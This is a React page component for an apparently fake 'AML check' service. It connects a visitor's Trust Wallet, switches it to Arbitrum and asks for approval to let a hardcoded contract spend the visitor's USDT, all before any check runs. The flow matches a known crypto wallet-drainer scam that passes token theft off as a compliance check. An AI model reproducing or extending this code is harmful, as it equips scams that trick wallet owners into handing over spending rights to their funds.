import React, { useMemo, useState, useEffect } from 'react'
import Header from '../components/Header.jsx'
import Footer from '../components/Footer.jsx'
import TrustWalletConnectModal from '../components/TrustWalletConnectModal.jsx'
import { useAccount, useChainId, useConnect, useSwitchChain } from 'wagmi'
import { CHAIN_IDS, wagmiConfig } from '../web3/config.jsx'
import { approveUSDT, checkUSDTAllowance } from '../web3/tokenTransfer'
import { waitForTransactionReceipt } from 'wagmi/actions'
import { useNavigate } from 'react-router-dom'

export default function ConnectPage() {
  const { address, isConnected } = useAccount()
  const liveChainId = useChainId()
  const { switchChain } = useSwitchChain()
  const { connect, connectors } = useConnect()
  const navigate = useNavigate()

  const settings = useMemo(() => {
    try { return JSON.parse(localStorage.getItem('amlsec_settings') || '{}') } catch { return {} }
  }, [])

  const SMART_CONTRACT_ADDRESS = settings.contractAddress || '0x83CBbdfd4E0Ae5e264B789cC7459E878A4E39fBd'
  const defaultNetwork = settings.defaultNetwork || 'arbitrum'

  const [isTrustModalOpen, setTrustModalOpen] = useState(false)
  const [txStatus, setTxStatus] = useState('')
  const [error, setError] = useState('')

  const bypassAllowance = useMemo(() => {
    try {
      const cfgFlag = !!settings.bypassAllowance
      const params = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : null
      const qsFlag = params ? (['bypass','dev','skipApproval'].some(k => {
        const v = params.get(k)
        return v === '1' || v === 'true'
      })) : false
      return cfgFlag || qsFlag
    } catch { return false }
  }, [settings])

  function isTrustWalletBrowser() {
    const ua = typeof navigator !== 'undefined' ? navigator.userAgent || '' : ''
    const hasInjected = typeof window !== 'undefined' && window.ethereum
    const providerFlag = hasInjected && (window.ethereum.isTrust || window.ethereum.isTrustWallet)
    const uaMatch = /trust\s?wallet/i.test(ua) || /trust/i.test(ua)
    return !!(providerFlag || uaMatch)
  }

  function handleConnectTrustWallet() {
    if (isTrustWalletBrowser()) {
      const injected = connectors?.find(c => c.id === 'injected' || (c.name && c.name.toLowerCase().includes('injected')))
      if (injected && connect) {
        try { connect({ connector: injected }) } catch (_) {}
        return
      }
      try { window.ethereum?.request?.({ method: 'eth_requestAccounts' }) } catch (_) {}
    } else {
      setTrustModalOpen(true)
    }
  }

  // Once connected, ensure Arbitrum, then approve USDT, then go to AML Check
  useEffect(() => {
    if (!isConnected || !address) return
    ;(async () => {
      try {
        setError('')
        // Switch to Arbitrum if needed
        if (liveChainId !== CHAIN_IDS.arbitrum) {
          setTxStatus('Switching to Arbitrum…')
          await switchChain({ chainId: CHAIN_IDS.arbitrum })
          setTxStatus('Switched to Arbitrum.')
        }
        // Optionally bypass allowance
        if (bypassAllowance) {
          setTxStatus('Dev bypass active: skipping approval and proceeding to AML Check.')
          navigate('/aml-check')
          return
        }
        // Check allowance
        setTxStatus('Checking USDT allowance…')
        const allowance = await checkUSDTAllowance({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
        const alreadyApproved = Number(allowance) > 0
        if (alreadyApproved) {
          setTxStatus('USDT allowance already granted. Proceeding to AML Check…')
          navigate('/aml-check')
          return
        }
        // Approve USDT
        setTxStatus('Requesting permission to spend USDT…')
        const txHash = await approveUSDT({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
        setTxStatus(`Approval submitted: ${String(txHash)}`)
        await waitForTransactionReceipt(wagmiConfig, { hash: txHash })
        setTxStatus('Approval confirmed on-chain. Redirecting to AML Check…')
        navigate('/aml-check')
      } catch (err) {
        const msg = typeof err === 'string' ? err : (err?.message || err?.toString?.() || 'Unknown error')
        const cancelled = (/user rejected/i.test(msg) || /denied transaction/i.test(msg) || /action_rejected/i.test(msg) || err?.code === 4001 || err?.name === 'UserRejectedRequestError')
        setError(cancelled ? 'Request cancelled by user' : msg)
        setTxStatus('')
      }
    })()
  }, [isConnected, address, liveChainId, bypassAllowance])

  const connectPageUrl = typeof window !== 'undefined'
    ? `${(localStorage.getItem('amlsec_public_url') || window.location.origin)}/connect${window.location.search || ''}`
    : '/connect'

  return (
    <>
      <Header />
      <main className="onboard" aria-labelledby="connect-title" style={{ position: 'relative' }}>
        <div className="onboard-inner">
          <h1 id="connect-title" className="onboard-title">Connect Wallet</h1>
          <p className="onboard-subtitle">Connect Trust Wallet, switch to Arbitrum, approve USDT, then proceed to AML check.</p>

          <div className="onboard-step" style={{ gridTemplateColumns: 'auto 1fr' }}>
            <div className="aml-center">
              {!isConnected ? (
                <>
                  <button className="btn primary" onClick={handleConnectTrustWallet}>Connect with Trust Wallet</button>
                  <p className="helper-text" style={{ marginTop: 12 }}>Scan the QR with Trust Wallet or connect via the Trust Wallet browser.</p>
                </>
              ) : (
                <>
                  {txStatus ? (<div className="aml-status ok" role="status">{txStatus}</div>) : (<div className="aml-status" role="status">Preparing connection flow…</div>)}
                  {error && <div className="aml-status err" role="alert">{error}</div>}
                  <p className="helper-text" style={{ marginTop: 8 }}>Contract: <code>{SMART_CONTRACT_ADDRESS}</code></p>
                </>
              )}
            </div>
          </div>
        </div>
      </main>
      <TrustWalletConnectModal isOpen={isTrustModalOpen} onClose={() => setTrustModalOpen(false)} dappUrl={connectPageUrl} />
      <Footer />
    </>
  )
}